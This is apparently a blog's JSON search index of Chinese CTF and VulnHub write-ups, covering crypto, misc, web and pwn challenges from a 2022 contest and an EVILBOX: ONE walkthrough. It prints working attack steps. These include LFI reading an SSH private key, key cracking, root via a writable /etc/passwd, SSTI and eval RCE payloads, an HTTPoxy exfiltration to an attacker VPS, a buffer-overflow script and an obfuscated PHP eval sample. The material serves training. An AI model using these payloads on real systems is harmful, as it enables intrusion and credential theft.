hFiBfrUwEFNEGesijNs2SNiZGNcvrAVBV4cEjMVLBGc3WvO2a0R2VEFoahcdhaVoaypvhNUBkNVNh1GJW0FEjshBGVp2a3s2M4SNEIzmugbLWvsDEWcvjdNo9ghLhaVoayivhORdSicBkLsiW0bVGIiZrpbdWksBGMhETAVBWSVskyGEzTp1SfhiVZNEjhGmGNFs0rRdWGV1kyVEz4zvjnGv1LVBkmsKjpV1mAzv1Np05cNorphEcKVBEubsV5VsVpF1UKhDGibZkkOo14FESdGvuSbvS5s1uESNEEVBWiV2rvsDEZp1SfhiVZNEjhGmGNFs0rRdWGV1kyVEz4zvEmGv1LVBkmsKjpV1mAzv1Np05HNBzFhEceNBzhcdhaVoayivhVpdVsNEGhsorNNBGMbEESbmf2O3kjSVGEzduZh2rcsZVMOVUeSNrpcdh4NDjtFs1qhwEicEjtOVGNsEOAiBjSpBjqsKSZSojEzv1Np05cGEhXR1kMbEzhcdhaV2atiBUApJGipKBesiWNiVVdRdkSc1jkVBhjcEmeVBhZhET0VDj0U1GNhZkZbEGpsijtbVzNNZhicBkuiDjpNBGIiZrpbEkmsKjpV1mehBSVhmjyO2aTRVceNZ5Zc055NNkNSm1NRmrNc0s1V0VAsohvswjVhvunNVhESVsezmjNp0kesVGAi2E6FwuVNvu5OokNSvSaSJEBFmk1iBuTPNjnbmBVc3WKsKjpV1mAzJESh3uHNBzhysBnzvrZbsGKF0SDC1WkO3VthKE1VDjTVESJG2aNbvrONiSTp0aJsoupbEOeVDEhb0kdNBSVbBf0NLB3p2ELsDSghiEsF2kjRmrJsoupbEOeVDEhb0kdNBSVbBf0NLB3p2ELsDSghiEsimSFREkfGdSsVZ1AimSFpEkMVDjNcVEQFZzps1VqsDhGPLz3imSFREkfGdSsVZ1AF1SIRm93Hi0gtFZ7HK4=\";eval('?\u003e'.$arCiCL($VvUrBZ($DEomKk($VCBZQW,$LnpnvY*2),$DEomKk($VCBZQW,$LnpnvY,$LnpnvY),$DEomKk($VCBZQW,0,$LnpnvY)))); 一直向下解码，最后发现cazy{PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy}。 ","date":"2022-01-12","objectID":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/:7:0","tags":["CTF"],"title":"长安战疫(Misc+Crypto)赛题复现","uri":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"},{"categories":["WriteUp"],"content":"0x07 LinearEquations from Crypto.Util.number import* from secret import flag assert flag[:5] == b'cazy{' assert flag[-1:] == b'}' flag = flag[5:-1] assert(len(flag) == 24) class my_LCG: def __init__(self, seed1 , seed2): self.state = [seed1,seed2] self.n = getPrime(64) while 1: self.a = bytes_to_long(flag[:8]) self.b = bytes_to_long(flag[8:16]) self.c = bytes_to_long(flag[16:]) if self.a \u003c self.n and self.b \u003c self.n and self.c \u003c self.n: break def next(self): new = (self.a * self.state[-1] + self.b * self.state[-2] + self.c) % self.n self.state.append( new ) return new def main(): lcg = my_LCG(getRandomInteger(64),getRandomInteger(64)) print(\"data = \" + str([lcg.next() for _ in range(5)])) print(\"n = \" + str(lcg.n)) if __name__ == \"__main__\": main() # data = [2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396] # n = 10104483468358610819 a、b、c是未知的，求解拼凑后能够得到flag。首先我们要弄清楚lcg.next()的算法过程。 data[0] = (a * seed2 + b * seed1 + c) mod n data[1] = (a * data[0] + b * seed2 + c) mod n data[2] = (a * data[1] + b * data[0] + c) mod n data[3] = (a * data[2] + b * data[1] + c) mod n data[4] = (a * data[3] + b * data[2] + c) mod n 设t[x] = (data[x + 1] - data[x] ) mod n t[0] = (data[1] - data[0] ) mod n t[1] = (data[2] - data[1] ) mod n t[2] = (data[3] - data[2] ) mod n = [a * data[2] + b * data[1] + c - (a * data[1] + b * data[0] + c)] mod n = [ a * (data[2] - data[1]) + b * (data[1] - data[0])] mod n = (a * t[1] + b * t[0]) mod n t[3] = (data[4] - data[3] ) mod n = (a * t[2] + b * t[1]) mod n t[0]到t[3]都能够求解出来，可以根据他们的值联立方程组，求解a和b 先消去b，求解a t[1] * t[2] = (a * t[1] * t[1] + b * t[0] * t[1]) mod n t[0] * t[3] = (a * t[2] * t[0] + b * t[1] * t[0]) mod n 得到下式 (t[2] * t[1] - t[3] * t[0]) = [a * (t[1] * t[1] - t[2] * t[0])] mod n 而后求出b、c，解出flag 脚本如下 t = []\rfor i in range(1,len(data)):\rtmp = data[i] - data[i - 1] t.append(tmp)\ra = (t[2] * t[1] - t[3] * t[0]) * gmpy2.invert(t[1] ** 2 - t[2] * t[0],n) % n\rb = (t[2] - a * t[1]) * gmpy2.invert(t[0],n) % n\rc = (data[4] - a * data[3] - b * data[2]) % n\rflag = b'cazy{' + long_to_bytes(a) + long_to_bytes(b) + long_to_bytes(c) + b'}'\rprint(flag)\r得到flag ","date":"2022-01-12","objectID":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/:8:0","tags":["CTF"],"title":"长安战疫(Misc+Crypto)赛题复现","uri":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"},{"categories":["WriteUp"],"content":"0x08 pipicc 用010打开bmp发现IHDR，但没有PNG头，修改文件。 删去bmp头，另存为png 得到图片 stegsolve提取蓝色低位数据，可以看到d9ff，ffd9是jpg文件尾的标识。 搜索FF D8 FF找到jpg的文件尾 删去后续数据后，在https://www.sweetscape.com/010editor/repository/scripts/file_info.php?file=StringReverse.1sc\u0026type=1\u0026sort=下载插件stringreverse.1sc逆转后保存为jpg文件。 得到flag ","date":"2022-01-12","objectID":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/:9:0","tags":["CTF"],"title":"长安战疫(Misc+Crypto)赛题复现","uri":"/2022-01-12-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABmisccrypto%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"},{"categories":["学习","安全技术"],"content":"\r","date":"2022-01-11","objectID":"/2022-01-11-%E6%89%93%E9%9D%B6-evilbox-one/:0:0","tags":["Web安全","渗透测试"],"title":"打靶-EVILBOX: ONE","uri":"/2022-01-11-%E6%89%93%E9%9D%B6-evilbox-one/"},{"categories":["学习","安全技术"],"content":"0x00 准备工作 靶机地址: https://www.vulnhub.com/entry/evilbox-one,736/ 难度等级: 高 打靶目标: 取得 root 权限 涉及攻击方法: 主机发现 端口扫描 强制方法 参数爆破 文件包含 PHP封装器 任意文件读取 SSH公钥登录 离线密码破解 系统权限漏洞利用 ","date":"2022-01-11","objectID":"/2022-01-11-%E6%89%93%E9%9D%B6-evilbox-one/:1:0","tags":["Web安全","渗透测试"],"title":"打靶-EVILBOX: ONE","uri":"/2022-01-11-%E6%89%93%E9%9D%B6-evilbox-one/"},{"categories":["学习","安全技术"],"content":"0x01 信息搜集 使用fping -gaq 192.168.92.0/24发现主机，-g通过指定开始和结束地址来生成目标列表或者一个IP/掩码形式，-a显示可ping通的目标，-q安静模式(不显示每个目标或每个ping的结果)。 然后使用nmap扫描端口，-A综合扫描，发现22和80端口及详细信息。 80端口为Apache默认界面，没有信息。 手动访问robots.txt后发现一个可疑昵称，多次尝试后无果。 使用gobuster dir -u http://192.168.92.130 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp命令爆破目录，发现存在secret目录。 打开后没有任何信息，尝试进一步对secret目录进行爆破，发现evil.php。 然后使用ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -w val.txt:VAL -u http://192.168.92.130/secret/evil.php?PARAM=VAL -fs 0进行参数爆破，-fs 0是忽略空结果。但是没有爆破出任何结果。 下面尝试文件包含漏洞，使用ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.92.130/secret/evil.php?FUZZ=../index.html -fs 0发现回显有command参数。 尝试访问passwd文件，发现最后存在一个mowree用户。 ","date":"2022-01-11","objectID":"/2022-01-11-%E6%89%93%E9%9D%B6-evilbox-one/:2:0","tags":["Web安全","渗透测试"],"title":"打靶-EVILBOX: ONE","uri":"/2022-01-11-%E6%89%93%E9%9D%B6-evilbox-one/"},{"categories":["学习","安全技术"],"content":"0x02 flag1 尝试后，发现只存在本地文件包含，使用php://filter封装器来读取源码，构造command=php://filter/convert.base64-encode/resource=evil.php 解码后得到 \u003c?php\r$filename = $_GET['command'];\rinclude($filename);\r?\u003e\r构造command=php://filter/write=convert.base64-decode/resource=test.txt\u0026txt=MTIz，其中txt=MTIz，MTIz是123使用base64加密后的内容。将此内容写入test.txt。尝试失败，没有写权限。 查看目标靶机支持的ssh认证类型ssh root@192.168.92.130 -v，-v就是以调试方式查看。可以看到目标系统支持公钥认证和密码认证。 构造command=../../../../../../home/mowree/.ssh，查看mowree的公钥。 查看私钥，构造command=../../../../../../../../../home/mowree/.ssh/id_rsa 把内容复制到本地，再通过chmod 600 id_rsa使权限没那么松散。最后使用ssh mowree@192.168.92.130 -i id_rsa密钥登录，结果需要私钥的密码。 使用python2 /usr/share/john/ssh2john.py ~/id_rsa \u003e ~/hash命令，将id_rsa转换成john能识别的hash格式。 将超级大字典rockyou复制过来，cp /usr/share/wordlists/rockyou.txt .，然后开始爆破john hash --wordlist=rockyou.txt，成功爆破出密码为unicorn 成功登录 查看flag1 ","date":"2022-01-11","objectID":"/2022-01-11-%E6%89%93%E9%9D%B6-evilbox-one/:3:0","tags":["Web安全","渗透测试"],"title":"打靶-EVILBOX: ONE","uri":"/2022-01-11-%E6%89%93%E9%9D%B6-evilbox-one/"},{"categories":["学习","安全技术"],"content":"0x03 flag2 fifind / -writable 2\u003e/dev/null|grep -v 'proc|run|sys'，查看可写权限的文件，发现了etc/passwd文件。 可以通过直接修改root用户名的密码了，使用openssl passwd -1命令，使用openssl加密算法来加密，输入的内容。 输入密码为han，返回了加密后的内容为$1$JPKeenWm$HWPSn4QyyNd4vj8Kn4uTT. 修改/etc/passwd。 然后切换到root用户。 ","date":"2022-01-11","objectID":"/2022-01-11-%E6%89%93%E9%9D%B6-evilbox-one/:4:0","tags":["Web安全","渗透测试"],"title":"打靶-EVILBOX: ONE","uri":"/2022-01-11-%E6%89%93%E9%9D%B6-evilbox-one/"},{"categories":["WriteUp"],"content":"\r","date":"2022-01-08","objectID":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/:0:0","tags":["CTF"],"title":"长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup","uri":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/"},{"categories":["WriteUp"],"content":"0x00 前言 ","date":"2022-01-08","objectID":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/:1:0","tags":["CTF"],"title":"长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup","uri":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/"},{"categories":["WriteUp"],"content":"0x01 八卦迷宫 一起走迷宫吧，要提交全拼音字符奥 走迷宫，将八卦转成字符为cazy{战长恙长战恙河长山山安战疫疫战疫安疫长安恙}，再进一步转成拼音cazy{zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang} ","date":"2022-01-08","objectID":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/:2:0","tags":["CTF"],"title":"长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup","uri":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/"},{"categories":["WriteUp"],"content":"0x02 RCE_No_Para \u003c?php\rif(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) { if(!preg_match('/session|end|next|header|dir/i',$_GET['code'])){\reval($_GET['code']);\r}else{\rdie(\"Hacker!\");\r}\r}else{\rshow_source(__FILE__);\r}\r?\u003e 我们可以通过传递的参数来进行RCE，get_defined_vars()，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。 a=phpinfo();\u0026code=eval(current(current(get_defined_var ()))); 构造a=system('cat flag.php');\u0026code=eval(current(current(get_defined_vars()))); ","date":"2022-01-08","objectID":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/:3:0","tags":["CTF"],"title":"长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup","uri":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/"},{"categories":["WriteUp"],"content":"0x03 西安加油 用wireshark打开pcap文件，追踪tcp流，在tcp.stream eq 6时，发现出现secret.txt的字样和一大串疑似base64的字符。 把字符提取出来，放到cyberchef里面，解密后疑似zip压缩包。 解压后得到48张照片，拼好就可以得到flag。 这个比较简单，直接开了个ppt手撕，得到cazy{make_XiAN_great_Again}。 ","date":"2022-01-08","objectID":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/:4:0","tags":["CTF"],"title":"长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup","uri":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/"},{"categories":["WriteUp"],"content":"0x04 no_cry_no_can from Crypto.Util.number import*\rfrom secret import flag,key\rassert len(key) \u003c= 5\rassert flag[:5] == b'cazy{'\rdef can_encrypt(flag,key):\rblock_len = len(flag) // len(key) + 1\rnew_key = key * block_len\rreturn bytes([i^j for i,j in zip(flag,new_key)])\rc = can_encrypt(flag,key)\rprint(c)\r# b'\u003cpH\\x86\\x1a\u0026\"m\\xce\\x12\\x00pm\\x97U1uA\\xcf\\x0c:NP\\xcf\\x18~l'\r阅读代码可知，flag的前5个字符是cazy{，该算法会把key的长度进行填充，然后逐一与flag的字符进行异或，得到密文，而且key的长度是小于等于5的，所以我们可以通过密文前5个字符与flag前5个字符进行异或，求出key值，密文的长度是26，而flag的长度绝对不超过26，可以把key值进行填充，与密文逐一异或，即可求出flag。 脚本如下： flag_head = b'cazy{'\rc_head = b'\u003cpH\\x86\\x1a'\rkey_max = (bytes([i^j for i,j in zip(flag_head,c_head)]))\rprint('key_max:',key_max)\rc = b'\u003cpH\\x86\\x1a\u0026\"m\\xce\\x12\\x00pm\\x97U1uA\\xcf\\x0c:NP\\xcf\\x18~l'\rblock_len = len(c)// len(key_max) + 1\rnew_key = key_max * block_len\rprint('new_key:',new_key)\rflag = (bytes([i^j for i,j in zip(c,new_key)]))\rprint('flag:',flag)\r最终的flag为：cazy{y3_1s_a_h4nds0me_b0y!} ","date":"2022-01-08","objectID":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/:5:0","tags":["CTF"],"title":"长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup","uri":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/"},{"categories":["WriteUp"],"content":"0x05 no_can_no_bb import random\rfrom Crypto.Util.number import long_to_bytes\rfrom Crypto.Cipher import AES\rfrom secret import flag\rassert flag[:5] ==b'cazy{'\rdef pad(m):\rtmp = 16-(len(m)%16)\rreturn m + bytes([tmp for _ in range(tmp)])\rdef encrypt(m,key):\raes = AES.new(key,AES.MODE_ECB)\rreturn aes.encrypt(m)\rif __name__ == \"__main__\":\rflag = pad(flag)\rkey = pad(long_to_bytes(random.randrange(1,1\u003c\u003c20)))\rc = encrypt(flag,key)\rprint(c)\r# b'\\x9d\\x18K\\x84n\\xb8b|\\x18\\xad4\\xc6\\xfc\\xec\\xfe\\x14\\x0b_T\\xe3\\x1b\\x03Q\\x96e\\x9e\\xb8MQ\\xd5\\xc3\\x1c'\r这道题的求解关键在于key值，它是从1到1048576中随机生成的一个数经过pad()函数处理得到的结果，可以发现这个范围并不是很大，可以直接暴力破解出来。 解密脚本如下： from Crypto.Util.number import long_to_bytes\rfrom Crypto.Cipher import AES\rdef pad(m):\rtmp = 16-(len(m)%16)\rreturn m + bytes([tmp for _ in range(tmp)])\rdef decrypt(m,key):\raes = AES.new(key,AES.MODE_ECB)\rreturn aes.decrypt(m)\rif __name__ == \"__main__\":\rc = b'\\x9d\\x18K\\x84n\\xb8b|\\x18\\xad4\\xc6\\xfc\\xec\\xfe\\x14\\x0b_T\\xe3\\x1b\\x03Q\\x96e\\x9e\\xb8MQ\\xd5\\xc3\\x1c'\rfor i in range(1,1\u003c\u003c20):\rkey = pad(long_to_bytes(i))\rflag = decrypt(c,key)\rif b'cazy{' in flag:\rprint(flag)\r稍等几秒钟就能跑出结果。flag为cazy{n0_c4n,bb?n0p3!} ","date":"2022-01-08","objectID":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/:6:0","tags":["CTF"],"title":"长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup","uri":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/"},{"categories":["WriteUp"],"content":"0x06 朴实无华的取证 查看镜像信息 filescan搜索一下txt文件，发现一个日记很可疑啊。 导出查看，发现个很像密钥的玩意儿，20211209。 搜索图片，发现一个flag文件。 导出查看一下，得到一串离谱的字母FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF] 再搜索关键字桌面，找到flag.zip的压缩包。 解压后查看发现和加密有关，foremost分离一下。 得到一段加密代码 //幼儿园水平的加密（部分）\rvoid Encrypt(string\u0026 str)\r{\rfor(int i = 0; i \u003c str.length(); i++)\r{\rif(str[i] \u003e='a'\u0026\u0026 str[i]\u003c='w')\rstr[i]+=3;\relse if(str[i]=='x')\rstr[i]='a';\relse if(str[i]=='y')\rstr[i]='b';\relse if(str[i]=='z')\rstr[i]='c'; else if(str[i]=='_')\rstr[i]='|';\rstr[i] -= 32;\r}\r}\r用大班水平的代码能力编写如下脚本： s1 = 'FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]'\rflag = ''\rfor i in range(len(s1)):\rk = chr(ord(s1[i])+32)\rif chr(ord(k)-3) \u003e='a'and chr(ord(k)-3)\u003c='w':\rk = chr(ord(k)-3)\relif(k == 'a'):\rk ='x';\relif(k == 'b'):\rk = 'y';\relif(k == 'c'):\rk = 'z'; elif(k == '|'):\rk = '_';\rflag += k\rprint (flag)\r最后得到cazy{Xian_will_certainly_succeed_in_fighting_the_epidemic} ","date":"2022-01-08","objectID":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/:7:0","tags":["CTF"],"title":"长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup","uri":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/"},{"categories":["WriteUp"],"content":"0x07 binary 使用jadx打开234文件，可以看到java代码。 将byte数组转成ascii码，再转base64，得到一大串的01，感觉是二维码，上脚本。 from PIL import Image from zlib import * MAX = 37 pic = Image.new(\"RGB\",(MAX,MAX)) str =\"0000000101110000000011111101110000000011111010110101011111000111011011111001000101000011110001110101101101000100100010110000011000111000001010100010010001011101101100110110101111010001001111101011101000000010010000101111100000000101010101010101010101010000000111111110010000000010011001111111111111000101010100001011111101000000110000101101000110010010000100110101011101101100000100111100110001101000001001011101111111100101011010001101010111001010110001110000000110100000000000010011010100100010001101110101110111110100101001001111111011100001100101000100010001101110110110011001100110011101111010011000111111101101001100000001000001110101000111000001011011111101111101100110101101001100010100110000100010100100111100100000100111001001011101010100110001110001100100000101010001001101111101110110010011111101011101110110001011100000010111011000101101000110010001111011000111101001001111010101000001110101110110101111110100010010101101100100100000011010001001111101101000100011100101100110111110011000111001111100000010110110111001111100010011001011001010001011101100000000011111111010110011100111001010111010110000000111000111011010110001010100100011111011100110101011010110001110111101000101001100001100110100000000000100100010101111101100011111111110100111010001010110111111110000001010101011001111101111110001011010011110001101100000000111111011110110000000100011000\" i=0 for y in range(0,MAX): for x in range(0,MAX): if(str[i] == '1'): pic.putpixel([x,y],(0,0,0)) else:pic.putpixel([x,y],(255,255,255)) i = i+1 pic.save(\"flag.png\") 最后得到图片，扫描得到flag{932b2c0070e4897ea7df0190dbf36ece} ","date":"2022-01-08","objectID":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/:8:0","tags":["CTF"],"title":"长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup","uri":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/"},{"categories":["WriteUp"],"content":"0x08 Flask 给了hint 利用.js?作为后缀绕过重定向，进入admin路由\u0001 根据提示admin/?name=找到ssti入口\u0001 测试了下存在过滤了__,subclasses\u0001,[,],builtins,args等\u0001 中括号通过attr的过滤器绕过，字符串以及下划线过滤用16进制绕过，\u0001 最终payload /admin?name={{lipsum\"attr('\\x5f\\x5fglobals\\x5f\\x5f')\"attr('get')\r('\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f')\"attr('get')('eval')\r('\\x5f\\x5fimport\\x5f\\x5f(\"os\").popen(\"cat%20flag\").read()')}}.js?\r","date":"2022-01-08","objectID":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/:9:0","tags":["CTF"],"title":"长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup","uri":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/"},{"categories":["WriteUp"],"content":"0x09 Flag配送中心 考点HTTPoxy漏洞(CVE-2016-5385)\u0001 报文中加个proxy:\u0001http://vps:2333 在自己vps上监听该端口\u0001 nc\u0001-lvp\u00012333\u0001 发个请求 接收到flag ","date":"2022-01-08","objectID":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/:10:0","tags":["CTF"],"title":"长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup","uri":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/"},{"categories":["WriteUp"],"content":"0x0A pwn1 from pwn import *\r# sh = process('pwn1')\rsh = remote(\"113.201.14.253\",16088)\rvul_addr = 0x08048540\rgift = sh.recv()[5:15]\rgift = int(gift,16)\rprint(hex(gift))\rpayload = b'a'*(52)+p32(gift+0x50)+b\"a\"*20+p32(vul_addr)\r# input()\rsh.send(payload)\rsh.interactive()\r","date":"2022-01-08","objectID":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/:11:0","tags":["CTF"],"title":"长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup","uri":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/"},{"categories":["WriteUp"],"content":"0x0B combat_slogan 将密文作为参数传进加密函数即可 ","date":"2022-01-08","objectID":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/:12:0","tags":["CTF"],"title":"长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup","uri":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/"},{"categories":["WriteUp"],"content":"0x0C cute_doge 信了信了 x64dbg\u0001打开\u0001QMessageBox\u0001下断点，跟几步就看到了\u0001flag ","date":"2022-01-08","objectID":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/:13:0","tags":["CTF"],"title":"长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup","uri":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/"},{"categories":["WriteUp"],"content":"0x0D hello_py Happy = [44,100,3,50,106,90,5,102,10,112]\rfor i in range(10):\rif(i%2==1):\rprint(chr(Happy[i]^i),end='')\relse:\rprint(chr(Happy[i]^Happy[i+1]),end='') ","date":"2022-01-08","objectID":"/2022-01-08-%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B-writeup/:14:0","tags":["CTF"],"title":"长安“战疫”网络安全卫士守护赛 1ynx战队 